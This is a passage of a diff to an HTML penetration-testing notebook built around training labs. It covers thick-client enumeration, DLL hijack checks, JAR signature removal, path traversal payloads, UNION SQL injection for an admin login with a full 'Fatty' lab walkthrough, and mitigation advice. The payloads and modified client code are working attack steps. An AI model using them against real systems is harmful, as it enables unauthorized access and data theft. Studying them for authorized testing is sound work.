+Plain FTP (not SFTP)
+Telnet connections
+Unencrypted database connections (port 3306, 5432)
+</code></pre>
+<h3 id="dll-hijacking-vulnerabilities"><a class="header" href="#dll-hijacking-vulnerabilities">DLL Hijacking Vulnerabilities</a></h3>
+<p><strong>Check DLL loading order:</strong></p>
+<pre><code class="language-bash"># Monitor DLL loading
+procmon.exe → Filter for "Load Image"
+# Look for: NAME NOT FOUND status → potential hijack point
+
+# Check application directory
+dir "C:\Program Files\Application\" | findstr ".dll"
+# If writable by user → potential hijack
+</code></pre>
+<h3 id="insecure-storage"><a class="header" href="#insecure-storage">Insecure Storage</a></h3>
+<p><strong>Check file system:</strong></p>
+<pre><code class="language-bash"># Look for credentials in files
+dir C:\Users\[username]\AppData\Local\Application\ -R
+grep -r "password" C:\Users\[username]\AppData\Local\
+
+# Check for cache files
+dir C:\Users\[username]\AppData\Local\Temp\
+ls -la ~/.cache/application/
+</code></pre>
+<hr>
+<h2 id="information-gathering-checklist"><a class="header" href="#information-gathering-checklist">Information Gathering Checklist</a></h2>
+<ul>
+<li><input disabled="" type="checkbox"> Locate the application executable(s)</li>
+<li><input disabled="" type="checkbox"> Identify application framework (.NET, Java, C++, etc.)</li>
+<li><input disabled="" type="checkbox"> Extract version information</li>
+<li><input disabled="" type="checkbox"> Review file properties and metadata</li>
+<li><input disabled="" type="checkbox"> Identify all dependencies (DLLs, libraries)</li>
+<li><input disabled="" type="checkbox"> Find configuration files</li>
+<li><input disabled="" type="checkbox"> Identify backend server(s) and databases</li>
+<li><input disabled="" type="checkbox"> Check for hardcoded credentials in strings</li>
+<li><input disabled="" type="checkbox"> Analyze network communication patterns</li>
+<li><input disabled="" type="checkbox"> Review file system permissions</li>
+<li><input disabled="" type="checkbox"> Check registry entries (Windows)</li>
+<li><input disabled="" type="checkbox"> Identify update/installation mechanisms</li>
+<li><input disabled="" type="checkbox"> Look for debug/logging capabilities</li>
+</ul>
+<hr>
+<h2 id="tools-checklist"><a class="header" href="#tools-checklist">Tools Checklist</a></h2>
+<p><strong>Static Analysis:</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> CFF Explorer (PE analysis)</li>
+<li><input disabled="" type="checkbox"> Detect It Easy (binary type detection)</li>
+<li><input disabled="" type="checkbox"> Strings (text extraction)</li>
+<li><input disabled="" type="checkbox"> dnSpy (.NET decompilation)</li>
+<li><input disabled="" type="checkbox"> jd-gui (Java decompilation)</li>
+<li><input disabled="" type="checkbox"> IDA or Ghidra (disassembly)</li>
+</ul>
+<p><strong>Dynamic Analysis:</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> Process Monitor (SysInternals)</li>
+<li><input disabled="" type="checkbox"> Process Explorer (SysInternals)</li>
+<li><input disabled="" type="checkbox"> TCPView (connection monitoring)</li>
+<li><input disabled="" type="checkbox"> Wireshark (packet capture)</li>
+</ul>
+<p><strong>Network Analysis:</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> Burp Suite (HTTP interception)</li>
+<li><input disabled="" type="checkbox"> Fiddler (HTTP proxy)</li>
+<li><input disabled="" type="checkbox"> tcpdump (packet capture)</li>
+</ul>
+<hr>
+<h2 id="next-steps-1"><a class="header" href="#next-steps-1">Next Steps</a></h2>
+<p>Once enumeration is complete:</p>
+<ol>
+<li><strong>If hardcoded credentials found</strong> → Attempt lateral movement using discovered credentials</li>
+<li><strong>If unencrypted communications</strong> → Set up MITM attack via ARP spoofing or network configuration</li>
+<li><strong>If DLL hijacking possible</strong> → Create malicious DLL for code execution</li>
+<li><strong>If custom server found</strong> → Perform web application penetration testing on backend</li>
+<li><strong>If insecure storage found</strong> → Extract and decrypt stored data</li>
+<li><strong>If authentication weak</strong> → Attempt credential brute-forcing or session hijacking</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="exploiting-web-vulnerabilities-in-thick-client-applications"><a class="header" href="#exploiting-web-vulnerabilities-in-thick-client-applications">Exploiting Web Vulnerabilities in Thick-Client Applications</a></h1>
+<p>Thick client applications with three-tier architecture communicate with backend servers to access databases. This server communication introduces web-specific vulnerabilities (SQL injection, path traversal, XXE, etc.) that can be exploited despite the additional network layer.</p>
+<hr>
+<h2 id="three-tier-architecture-vulnerabilities"><a class="header" href="#three-tier-architecture-vulnerabilities">Three-Tier Architecture Vulnerabilities</a></h2>
+<p>While three-tier architecture prevents direct database access, it introduces new attack surfaces:</p>
+<pre><code>Thick Client
+    ↓ (May validate input)
+Application Server
+    ↓ (Vulnerable to web attacks)
+Database Server
+</code></pre>
+<p><strong>Key insight:</strong> Input validation on the client can be bypassed by modifying the client code, allowing unvalidated input to reach the server.</p>
+<hr>
+<h2 id="reconnaissance-configuration-file-analysis"><a class="header" href="#reconnaissance-configuration-file-analysis">Reconnaissance: Configuration File Analysis</a></h2>
+<h3 id="identifying-backend-communications"><a class="header" href="#identifying-backend-communications">Identifying Backend Communications</a></h3>
+<p><strong>Extract and analyze configuration files:</strong></p>
+<pre><code class="language-bash"># Extract JAR file contents
+jar xf application.jar
+
+# Search for configuration files
+find . -name "*.xml" -o -name "*.properties" -o -name "*.conf"
+
+# Look for connection details
+grep -r "host\|port\|server\|database" . --include="*.xml" --include="*.properties"
+</code></pre>
+<h3 id="spring-framework-configuration"><a class="header" href="#spring-framework-configuration">Spring Framework Configuration</a></h3>
+<p>Spring framework applications use XML configuration files (beans.xml) for dependency injection:</p>
+<pre><code class="language-xml">&lt;!-- Connection configuration --&gt;
+&lt;bean id="connectionContext" class="package.ConnectionContext"&gt;
+    &lt;constructor-arg index="0" value="server.example.com"/&gt;
+    &lt;constructor-arg index="1" value="8080"/&gt;
+&lt;/bean&gt;
+
+&lt;!-- Credentials and secrets --&gt;
+&lt;bean id="secretHolder" class="package.SecretHolder"&gt;
+    &lt;property name="secret" value="hardcodedsecret123"/&gt;
+&lt;/bean&gt;
+</code></pre>
+<p><strong>Extract sensitive data:</strong></p>
+<ul>
+<li>Server hostnames and ports</li>
+<li>Hardcoded credentials</li>
+<li>API keys and secrets</li>
+<li>Encryption keys</li>
+</ul>
+<h3 id="modifying-configuration-files"><a class="header" href="#modifying-configuration-files">Modifying Configuration Files</a></h3>
+<p><strong>Change backend server address:</strong></p>
+<pre><code class="language-xml">&lt;!-- Original --&gt;
+&lt;constructor-arg index="1" value="8000"/&gt;
+
+&lt;!-- Modified (to intercept traffic) --&gt;
+&lt;constructor-arg index="1" value="8080"/&gt;
+</code></pre>
+<p><strong>Update hosts file to redirect traffic:</strong></p>
+<pre><code># Windows: C:\Windows\System32\drivers\etc\hosts
+10.10.10.1   server.example.com
+
+# Linux: /etc/hosts
+10.10.10.1   server.example.com
+</code></pre>
+<hr>
+<h2 id="jar-file-modification--signature-bypass"><a class="header" href="#jar-file-modification--signature-bypass">JAR File Modification &amp; Signature Bypass</a></h2>
+<h3 id="jar-structure"><a class="header" href="#jar-structure">JAR Structure</a></h3>
+<pre><code>application.jar
+├── META-INF/
+│   ├── MANIFEST.MF
+│   ├── 1.RSA          (Digital signature)
+│   ├── 1.SF           (Signature file)
+│   └── maven/
+├── htb/
+│   └── package/
+│       └── Class.class
+└── config.properties
+</code></pre>
+<h3 id="signature-validation"><a class="header" href="#signature-validation">Signature Validation</a></h3>
+<p>Java applications verify JAR integrity using:</p>
+<ol>
+<li><strong>SHA-256 hashes</strong> in MANIFEST.MF</li>
+<li><strong>Digital signatures</strong> (1.RSA, 1.SF files)</li>
+</ol>
+<h3 id="bypass-signature-validation"><a class="header" href="#bypass-signature-validation">Bypass Signature Validation</a></h3>
+<p><strong>Step 1: Extract JAR contents</strong></p>
+<pre><code class="language-bash">jar xf application.jar
+</code></pre>
+<p><strong>Step 2: Modify files</strong></p>
+<p>Edit configuration files or decompiled classes.</p>
+<p><strong>Step 3: Remove signature files</strong></p>
+<pre><code class="language-bash">rm META-INF/1.RSA
+rm META-INF/1.SF
+</code></pre>
+<p><strong>Step 4: Clear hash values from MANIFEST.MF</strong></p>
+<pre><code># Before
+Name: htb/package/Class.class
+SHA-256-Digest: abc123def456...
+
+# After (remove all Name: and SHA-256-Digest entries)
+Manifest-Version: 1.0
+Main-Class: htb.package.Starter
+</code></pre>
+<p><strong>Important:</strong> MANIFEST.MF must end with a newline character.</p>
+<p><strong>Step 5: Rebuild JAR</strong></p>
+<pre><code class="language-bash">jar -cmf META-INF/MANIFEST.MF application-modified.jar *
+</code></pre>
+<h3 id="decompilation--modification"><a class="header" href="#decompilation--modification">Decompilation &amp; Modification</a></h3>
+<p><strong>Decompile using JD-GUI:</strong></p>
+<pre><code class="language-bash">jd-gui application.jar
+# Save all sources: Menu → Save All Sources
+</code></pre>
+<p><strong>Modify source code:</strong></p>
+<p>Change hardcoded values, authentication logic, or API endpoints.</p>
+<p><strong>Recompile modified classes:</strong></p>
+<pre><code class="language-bash">javac -cp application.jar ModifiedClass.java
+</code></pre>
+<p><strong>Replace compiled class files:</strong></p>
+<pre><code class="language-bash"># Extract original JAR to 'raw' directory
+cp application.jar raw/
+cd raw
+jar xf application.jar
+
+# Copy modified class files
+cp ../ModifiedClass.class htb/package/ModifiedClass.class
+
+# Rebuild
+jar -cmf META-INF/MANIFEST.MF ../application-modified.jar *
+</code></pre>
+<hr>
+<h2 id="path-traversal-vulnerabilities"><a class="header" href="#path-traversal-vulnerabilities">Path Traversal Vulnerabilities</a></h2>
+<h3 id="case-study-file-browser-exploitation"><a class="header" href="#case-study-file-browser-exploitation">Case Study: File Browser Exploitation</a></h3>
+<p><strong>Vulnerable code (server-side):</strong></p>
+<pre><code class="language-java">public String showFiles(String folder) {
+    // No validation on 'folder' parameter
+    File dir = new File("/opt/app/files/" + folder);
+    return listFiles(dir);
+}
+</code></pre>
+<p><strong>Exploitation:</strong></p>
+<ol>
+<li>
+<p><strong>Identify file path structure:</strong></p>
+<ul>
+<li>Application shows files from: <code>/opt/app/files/notes/</code></li>
+<li>Target: Read files outside intended directory</li>
+</ul>
+</li>
+<li>
+<p><strong>Craft path traversal payload:</strong></p>
+<pre><code>../../../../../../etc/passwd
+../../../sensitive.txt
+</code></pre>
+</li>
+<li>
+<p><strong>Modify client code to send traversal:</strong></p>
+<p>Original code in <code>ClientGuiTest.java</code>:</p>
+<pre><code class="language-java">response = invoker.showFiles("notes");
+</code></pre>
+<p>Modified code:</p>
+<pre><code class="language-java">response = invoker.showFiles("../../../");
+</code></pre>
+</li>
+<li>
+<p><strong>Filter bypass:</strong></p>
+<p>If server filters <code>/</code> character:</p>
+<pre><code>..\\..\\..\\etc\\passwd    (Windows)
+..%2f..%2f..%2fetc%2fpasswd  (URL encoding)
+</code></pre>
+</li>
+<li>
+<p><strong>Download sensitive files:</strong></p>
+<p>Modify <code>open()</code> function to save files:</p>
+<pre><code class="language-java">public String open(String folder, String filename) {
+    // ... send request ...
+    byte[] content = response.getContent();
+    FileOutputStream fos = new FileOutputStream(
+        System.getProperty("user.home") + "/Desktop/" + filename);
+    fos.write(content);
+    fos.close();
+    return "File saved to desktop";
+}
+</code></pre>
+</li>
+</ol>
+<hr>
+<h2 id="sql-injection-attacks"><a class="header" href="#sql-injection-attacks">SQL Injection Attacks</a></h2>
+<h3 id="vulnerable-pattern"><a class="header" href="#vulnerable-pattern">Vulnerable Pattern</a></h3>
+<p><strong>Server-side code:</strong></p>
+<pre><code class="language-java">rs = stmt.executeQuery(
+    "SELECT id,username,email,password,role FROM users " +
+    "WHERE username='" + user.getUsername() + "'"
+);
+</code></pre>
+<p><strong>Vulnerability:</strong> Username is directly concatenated into SQL query without sanitization.</p>
+<h3 id="exploitation-technique-union-based-injection"><a class="header" href="#exploitation-technique-union-based-injection">Exploitation Technique: UNION-Based Injection</a></h3>
+<p><strong>Normal query:</strong></p>
+<pre><code class="language-sql">SELECT id,username,email,password,role FROM users 
+WHERE username='qtc'
+</code></pre>
+<p><strong>UNION injection payload:</strong></p>
+<pre><code class="language-sql">SELECT id,username,email,password,role FROM users 
+WHERE username='admin' UNION SELECT 1,'hacker','h@ck.com','mypass','admin'
+</code></pre>
+<p><strong>Result:</strong> Server returns fake user entry with controlled password and admin role.</p>
+<h3 id="bypassing-client-side-hashing"><a class="header" href="#bypassing-client-side-hashing">Bypassing Client-Side Hashing</a></h3>
+<p><strong>Client-side password processing:</strong></p>
+<pre><code class="language-java">public void setPassword(String password) {
+    String hashString = username + password + "clarabibisecret";
+    MessageDigest digest = MessageDigest.getInstance("SHA-256");
+    byte[] hash = digest.digest(hashString.getBytes());
+    this.password = DatatypeConverter.printHexString(hash);
+}
+</code></pre>
+<p><strong>Problem:</strong> Password is hashed using username, making standard SQL injection impossible.</p>
+<p><strong>Solution:</strong> Modify client code to send plaintext password.</p>
+<p><strong>Modified code:</strong></p>
+<pre><code class="language-java">public void setPassword(String password) {
+    // Send plaintext instead of hash
+    this.password = password;
+}
+</code></pre>
+<p><strong>Now SQL injection works:</strong></p>
+<pre><code class="language-java">username = "admin' UNION SELECT 1,'attacker','a@b.com','plainpass','admin"
+password = "plainpass"
+</code></pre>
+<p><strong>Resulting SQL query:</strong></p>
+<pre><code class="language-sql">SELECT id,username,email,password,role FROM users 
+WHERE username='admin' UNION SELECT 1,'attacker','a@b.com','plainpass','admin'
+</code></pre>
+<p><strong>Authentication logic:</strong></p>
+<pre><code class="language-java">// Query returns attacker's fake record
+if (retrievedPassword.equals(suppliedPassword)) {
+    return loginSuccess();
+}
+</code></pre>
+<p>Since both are plaintext and match, login succeeds with admin privileges.</p>
+<h3 id="error-based-sql-injection"><a class="header" href="#error-based-sql-injection">Error-Based SQL Injection</a></h3>
+<p><strong>Extract information from error messages:</strong></p>
+<p><strong>Vulnerable code:</strong></p>
+<pre><code class="language-java">try {
+    rs = stmt.executeQuery(query);
+} catch (SQLException e) {
+    logger.logError("Failure with SQL query: ==&gt; " + query);
+    logger.logError("Exception: " + e.getMessage());
+}
+</code></pre>
+<p><strong>Exploit:</strong></p>
+<ol>
+<li>
+<p>Trigger SQL error with invalid syntax:</p>
+<pre><code>username: qtc' (incomplete quote)
+</code></pre>
+</li>
+<li>
+<p>Check error logs for:</p>
+<ul>
+<li>Database version</li>
+<li>Table/column names</li>
+<li>Query structure</li>
+</ul>
+</li>
+<li>
+<p>Use information for crafted UNION injections</p>
+</li>
+</ol>
+<hr>
+<h2 id="complete-attack-scenario-fatty-client-case-study"><a class="header" href="#complete-attack-scenario-fatty-client-case-study">Complete Attack Scenario: Fatty Client Case Study</a></h2>
+<h3 id="step-1-discover-configuration"><a class="header" href="#step-1-discover-configuration">Step 1: Discover Configuration</a></h3>
+<p><strong>Find port configuration:</strong></p>
+<pre><code class="language-bash">strings fatty-client.jar | grep -i "port\|host"
+# Output: server.fatty.htb, 8000
+</code></pre>
+<p><strong>Extract JAR and modify beans.xml:</strong></p>
+<pre><code class="language-xml">&lt;constructor-arg index="1" value="1337"/&gt;  &lt;!-- Changed from 8000 --&gt;
+</code></pre>
+<h3 id="step-2-bypass-signature-validation"><a class="header" href="#step-2-bypass-signature-validation">Step 2: Bypass Signature Validation</a></h3>
+<pre><code class="language-bash"># Remove signature files
+rm META-INF/1.RSA META-INF/1.SF
+
+# Clear MANIFEST.MF hash values
+cat &gt; META-INF/MANIFEST.MF &lt;&lt; 'EOF'
+Manifest-Version: 1.0
+Main-Class: htb.fatty.client.run.Starter
+
+EOF
+
+# Rebuild JAR
+jar -cmf META-INF/MANIFEST.MF fatty-client-mod.jar *
+</code></pre>
+<h3 id="step-3-exploit-path-traversal"><a class="header" href="#step-3-exploit-path-traversal">Step 3: Exploit Path Traversal</a></h3>
+<p><strong>Decompile and modify ClientGuiTest.java:</strong></p>
+<pre><code class="language-java">// Original
+response = invoker.showFiles("configs");
+
+// Modified
+response = invoker.showFiles("../");
+</code></pre>
+<p><strong>Rebuild and deploy modified JAR.</strong></p>
+<p><strong>Result:</strong> Access parent directories and find <code>fatty-server.jar</code>.</p>
+<h3 id="step-4-download-server-application"><a class="header" href="#step-4-download-server-application">Step 4: Download Server Application</a></h3>
+<p><strong>Modify Invoker.java open() function:</strong></p>
+<pre><code class="language-java">public String open(String folder, String filename) {
+    this.action = new ActionMessage(this.sessionID, "open");
+    this.action.addArgument(folder);
+    this.action.addArgument(filename);
+    sendAndRecv();
+    
+    // Download file to desktop
+    String desktopPath = System.getProperty("user.home") + 
+                         "\\Desktop\\" + filename;
+    FileOutputStream fos = new FileOutputStream(desktopPath);
+    byte[] content = this.response.getContent();
+    fos.write(content);
+    fos.close();
+    
+    return "File saved to " + desktopPath;
+}
+</code></pre>
+<h3 id="step-5-analyze-server-application"><a class="header" href="#step-5-analyze-server-application">Step 5: Analyze Server Application</a></h3>
+<p><strong>Decompile fatty-server.jar using JD-GUI.</strong></p>
+<p><strong>Find vulnerable login code in FattyDbSession.class:</strong></p>
+<pre><code class="language-java">rs = stmt.executeQuery(
+    "SELECT id,username,email,password,role FROM users " +
+    "WHERE username='" + user.getUsername() + "'"
+);
+</code></pre>
+<h3 id="step-6-craft-sql-injection-payload"><a class="header" href="#step-6-craft-sql-injection-payload">Step 6: Craft SQL Injection Payload</a></h3>
+<p><strong>Modify User.java to send plaintext password:</strong></p>
+<pre><code class="language-java">public void setPassword(String password) {
+    this.password = password;  // Don't hash
+}
+</code></pre>
+<p><strong>Rebuild fatty-client with modified code.</strong></p>
+<p><strong>Login payload:</strong></p>
+<ul>
+<li>Username: <code>test' UNION SELECT 1,'hacker','h@ck.com','pass123','admin</code></li>
+<li>Password: <code>pass123</code></li>
+</ul>
+<p><strong>Result:</strong> Login as admin user.</p>
+<hr>
+<h2 id="common-vulnerable-patterns"><a class="header" href="#common-vulnerable-patterns">Common Vulnerable Patterns</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Pattern</th><th>Vulnerability</th><th>Risk</th></tr>
+</thead>
+<tbody>
+<tr><td>String concatenation in SQL</td><td>SQL Injection</td><td>CRITICAL</td></tr>
+<tr><td>Direct file path concatenation</td><td>Path Traversal</td><td>HIGH</td></tr>
+<tr><td>Client-side validation only</td><td>Authentication bypass</td><td>CRITICAL</td></tr>
+<tr><td>Hardcoded credentials</td><td>Credential theft</td><td>CRITICAL</td></tr>
+<tr><td>No signature validation</td><td>Code modification</td><td>HIGH</td></tr>
+<tr><td>Error messages show SQL</td><td>Information disclosure</td><td>MEDIUM</td></tr>
+<tr><td>Unencrypted backend communication</td><td>MITM attacks</td><td>HIGH</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="testing-methodology-1"><a class="header" href="#testing-methodology-1">Testing Methodology</a></h2>
+<ol>
+<li>
+<p><strong>Extract and analyze configuration files</strong></p>
+<ul>
+<li>Find server addresses and ports</li>
+<li>Identify authentication mechanism</li>
+<li>Note hardcoded secrets</li>
+</ul>
+</li>
+<li>
+<p><strong>Modify JAR files</strong></p>
+<ul>
+<li>Decompile using JD-GUI</li>
+<li>Identify vulnerable functions</li>
+<li>Modify code to remove validation</li>
+</ul>
+</li>
+<li>
+<p><strong>Test for input validation bypasses</strong></p>
+<ul>
+<li>Path traversal</li>
+<li>SQL injection</li>
+<li>Command injection</li>
+</ul>
+</li>
+<li>
+<p><strong>Escalate privileges</strong></p>
+<ul>
+<li>Modify role assignments</li>
+<li>Create admin users</li>
+<li>Bypass authentication</li>
+</ul>
+</li>
+<li>
+<p><strong>Download sensitive files</strong></p>
+<ul>
+<li>Extract server applications</li>
+<li>Access database files</li>
+<li>Retrieve configuration</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="assessment-checklist-3"><a class="header" href="#assessment-checklist-3">Assessment Checklist</a></h2>
+<ul>
+<li><input disabled="" type="checkbox"> Extract JAR/EXE files and analyze configuration</li>
+<li><input disabled="" type="checkbox"> Identify backend server and port</li>
+<li><input disabled="" type="checkbox"> Check for signature validation</li>
+<li><input disabled="" type="checkbox"> Decompile and review authentication code</li>
+<li><input disabled="" type="checkbox"> Test for path traversal vulnerabilities</li>
+<li><input disabled="" type="checkbox"> Test for SQL injection in login and queries</li>
+<li><input disabled="" type="checkbox"> Attempt to bypass client-side validation</li>
+<li><input disabled="" type="checkbox"> Modify client code and rebuild application</li>
+<li><input disabled="" type="checkbox"> Craft privilege escalation payloads</li>
+<li><input disabled="" type="checkbox"> Download and analyze server components</li>
+<li><input disabled="" type="checkbox"> Document all modifications and payloads</li>
+</ul>
+<hr>
+<h2 id="mitigation-strategies"><a class="header" href="#mitigation-strategies">Mitigation Strategies</a></h2>
+<p><strong>For developers:</strong></p>
+<ol>
+<li><strong>Input validation:</strong> Sanitize and validate all user input</li>
+<li><strong>Parameterized queries:</strong> Use prepared statements for SQL</li>
+<li><strong>Code signing:</strong> Properly sign and validate JARs</li>
+<li><strong>Server-side validation:</strong> Never trust client-side checks</li>
+<li><strong>Encryption:</strong> Encrypt sensitive data in transit and at rest</li>
+<li><strong>Error handling:</strong> Don’t expose SQL errors to users</li>
+<li><strong>Access control:</strong> Implement role-based access on server</li>
+<li><strong>Logging:</strong> Log and monitor suspicious activities</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="tomcat-1"><a class="header" href="#tomcat-1">Tomcat</a></h1>
+<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory map</a></h2>
 <ul>
 <li><a href="#tomcat--discovery--enumeration">Tomcat — Discovery &amp; Enumeration — fingerprinting, /docs, /manager, directory structure, default credentials, enumeration techniques</a></li>
 <li><a href="#attacking-tomcat">Attacking Tomcat — credential brute force, WAR upload RCE, web shell hygiene, CVE-2020-1938 Ghostcat (AJP LFI)</a></li>
 <li><a href="#tomcat-cgi--cve-2019-0232">Tomcat CGI — CVE-2019-0232 — enableCmdLineArguments RCE, ffuf CGI discovery, URL-encoded command injection (Windows)</a></li>
 </ul>
-<h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
+<h2 id="summary-12"><a class="header" href="#summary-12">Summary</a></h2>
 <p>Apache Tomcat is an open-source web server for hosting Java-based applications. With over 220,000 live Tomcat websites and significant adoption (3.8% of top 100k sites), it’s a common target on internal networks.</p>
 <p><strong>Key characteristics:</strong></p>
 <ul>
@@ -28538,7 +29691,7 @@ spring.datasource.password=SecureP@ssw0rd!
 </table>
 </div>
 <hr>
-<h2 id="assessment-checklist-2"><a class="header" href="#assessment-checklist-2">Assessment Checklist</a></h2>
+<h2 id="assessment-checklist-4"><a class="header" href="#assessment-checklist-4">Assessment Checklist</a></h2>
 <ul>
 <li><input disabled="" type="checkbox"> Brute force <code>/manager/html</code> with default credentials</li>
 <li><input disabled="" type="checkbox"> Test <code>/host-manager</code> with same credentials</li>
@@ -28701,7 +29854,7 @@ http://10.129.204.227:8080/cgi/welcome.bat?&amp;C%3A%5CWindows%5CTemp%5Cshell.ex
 <li>Avoid running Tomcat on Windows where possible</li>
 </ul>
 <hr>
-<h2 id="summary-12"><a class="header" href="#summary-12">Summary</a></h2>
+<h2 id="summary-13"><a class="header" href="#summary-13">Summary</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -28908,7 +30061,7 @@ Server: Apache Tomcat/9.0.30
 <li><strong>Document all findings</strong> — Note versions, paths, and potential entry points</li>
 </ol>
 <hr>
-<h2 id="next-steps-1"><a class="header" href="#next-steps-1">Next Steps</a></h2>
+<h2 id="next-steps-2"><a class="header" href="#next-steps-2">Next Steps</a></h2>
 <p>Once enumeration is complete:</p>
 <ul>
 <li>If credentials are found/guessed → exploit Manager via WAR upload</li>
@@ -28918,12 +30071,12 @@ Server: Apache Tomcat/9.0.30
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="wordpress-1"><a class="header" href="#wordpress-1">WordPress</a></h1>
-<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory map</a></h2>
+<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory map</a></h2>
 <ul>
 <li><a href="#wordpress--discovery--enumeration">WordPress — Discovery &amp; Enumeration — footprinting, manual enumeration, user roles, WPScan</a></li>
 <li><a href="#attacking-wordpress">Attacking WordPress — login brute force, theme editor RCE, Metasploit shell upload, mail-masta LFI, wpDiscuz RCE</a></li>
 </ul>
-<h2 id="summary-13"><a class="header" href="#summary-13">Summary</a></h2>
+<h2 id="summary-14"><a class="header" href="#summary-14">Summary</a></h2>
 <p>WordPress is the most widely deployed CMS on the internet (~32.5% of all sites), making it a near-certain encounter during external penetration tests. It runs PHP on Apache with a MySQL backend and exposes a predictable directory structure: <code>/wp-admin/</code> (admin dashboard), <code>/wp-content/plugins/</code>, <code>/wp-content/themes/</code>, and <code>/wp-login.php</code>. The presence of these paths in <code>robots.txt</code> or page source is usually enough to confirm a WordPress installation.</p>
 <p><strong>Manual enumeration</strong> starts with <code>curl | grep WordPress</code> to extract the version from the <code>&lt;meta name="generator"&gt;</code> tag, then <code>grep themes</code> and <code>grep plugins</code> across multiple page URLs to map installed components and their versions (exposed via <code>?ver=</code> query parameters). Plugin <code>readme.txt</code> files — often accessible when directory listing is enabled — confirm exact versions. Many plugins carry publicly known CVEs; <code>mail-masta 1.0.0</code> (LFI), <code>wpDiscuz 7.0.4</code> (unauthenticated RCE), and outdated core versions are common findings.</p>
 <p><strong>User enumeration</strong> is possible because WordPress returns distinct error messages for unknown usernames versus wrong passwords at <code>/wp-login.php</code>. <strong>WPScan</strong> (<code>wpscan --url TARGET --enumerate --api-token TOKEN</code>) automates core/theme/plugin/user enumeration and maps findings to CVEs via WPVulnDB (free tier: 25 requests/day). Automated scanning alone is insufficient — WPScan only sees plugins referenced on scanned pages; manual <code>curl | grep plugins</code> across multiple posts catches the rest. The two methods must be combined.</p>
@@ -29194,7 +30347,7 @@ Sitemap: https://inlanefreight.local/wp-sitemap.xml
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="command-injection-1"><a class="header" href="#command-injection-1">Command Injection</a></h1>
-<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory map</a></h2>
+<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory map</a></h2>
 <ul>
 <li><a href="#intro-to-command-injections">Intro — what command injection is, OWASP #3, OS command injection, PHP/NodeJS examples</a></li>
 <li><a href="#detecting-and-injecting-commands">Detection — injection operators, injecting commands, bypassing front-end validation, AND/OR operators, cross-injection operator reference</a></li>
@@ -29206,7 +30359,7 @@ Sitemap: https://inlanefreight.local/wp-sitemap.xml
 <li><a href="#evasion-tools">Evasion tools — Bashfuscator (Linux), DOSfuscation (Windows)</a></li>
 <li><a href="#command-injection-prevention">Prevention — system command avoidance, input validation, sanitization, server configuration</a></li>
 </ul>
-<h2 id="summary-14"><a class="header" href="#summary-14">Summary</a></h2>
+<h2 id="summary-15"><a class="header" href="#summary-15">Summary</a></h2>
 <p><strong>Command injection</strong> vulnerabilities arise when user-controlled input flows unsanitized into a function that executes OS commands, allowing attackers to run arbitrary commands on the back-end server. Ranked <strong>#3 in OWASP’s Top 10</strong>, command injection is among the most critical web vulnerabilities — a successful exploitation can lead to full network compromise. All major web languages expose system command primitives (<code>exec</code>/<code>system</code>/<code>shell_exec</code> in PHP; <code>child_process.exec</code> / <code>child_process.spawn</code> in Node); the same injection techniques apply across all of them, and to any thick client or binary that passes unsanitized input to shell commands.</p>
 <p><strong>Detection</strong> mirrors exploitation: append a command after a known-good value using an injection operator and observe whether output changes. The core <strong>injection operators</strong> cover <code>;</code> (both commands run), <code>\n</code> / <code>%0a</code> (both, newline-separated), <code>&amp;</code> (both, second shown first), <code>|</code> (both, only second shown), <code>&amp;&amp;</code> (both only if first succeeds), <code>||</code> (second only if first fails), and sub-shell forms <code>`</code> and <code>$()</code> (Linux-only). When a front-end format check blocks a payload but fires <strong>no network request</strong>, validation is client-side only — bypass by sending a raw request through Burp Suite or ZAP, URL-encoding the payload before sending.</p>
 <p><strong>Filter and WAF identification</strong> starts by reducing the payload to one character at a time. An “Invalid input” inline response indicates an app-layer filter (e.g., a PHP <code>strpos</code> blacklist); a separate error page with IP/request details indicates a WAF. Map every blocked operator before choosing a bypass strategy.</p>
@@ -29607,7 +30760,7 @@ var ip = DOMPurify.sanitize(ip);
 <p>Secure configuration complements secure coding — neither alone is sufficient. Pair both with ongoing penetration testing, since any single mistake in a large codebase can reintroduce a vulnerability.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="file-inclusion-1"><a class="header" href="#file-inclusion-1">File inclusion</a></h1>
-<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory map</a></h2>
+<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory map</a></h2>
 <ul>
 <li><a href="#intro-to-file-inclusions">Intro to file inclusions — LFI basics, templating, impact, examples (PHP, Node, Java, .NET), read vs execute</a></li>
 <li><a href="#local-file-inclusion-lfi--exploitation-basics">Local file inclusion (LFI) — exploitation basics, traversal, prefixes, extensions, second-order</a></li>
@@ -29618,7 +30771,7 @@ var ip = DOMPurify.sanitize(ip);
 <li><a href="#lfi-and-file-uploads">LFI and file uploads — polyglot images, discovering upload paths, PHP <code>zip://</code> / <code>phar://</code> chains, legacy phpinfo edge case</a></li>
 <li><a href="#log-poisoning-for-lfi--rce">Log poisoning (LFI → RCE) — PHP session files, Apache/Nginx access logs, <code>/proc</code> hints, SSH/FTP/mail logs, permissions and safety</a></li>
 </ul>
-<h2 id="summary-15"><a class="header" href="#summary-15">Summary</a></h2>
+<h2 id="summary-16"><a class="header" href="#summary-16">Summary</a></h2>
